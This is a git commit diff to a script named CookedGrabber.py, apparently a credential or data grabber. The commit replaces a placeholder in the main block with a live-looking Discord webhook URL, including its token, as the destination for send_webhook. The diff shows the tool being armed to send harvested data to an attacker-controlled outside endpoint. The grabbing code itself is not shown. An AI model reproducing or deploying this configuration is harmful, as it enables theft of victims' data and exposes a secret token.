70129b75bf3d4cdfd79a5f8ba092d5d940480d99
SleemSeverus <107605574+SleemSeverus@users.noreply.github.com>
2024-04-29 01:57:14 +0200

    Update CookedGrabber.py

--- CookedGrabber.py
+++ CookedGrabber.py
@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(["YOUR DISCORD WEBHOOK URL"])
+        send_webhook(["https://discord.com/api/webhooks/1234240226004832299/9IFN-D4L-mNix9IGTZ_mqrafWAWm_YA2IILVybR3uq5ZtCVKjeeFLYimnZh4MAoSUhyI"])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
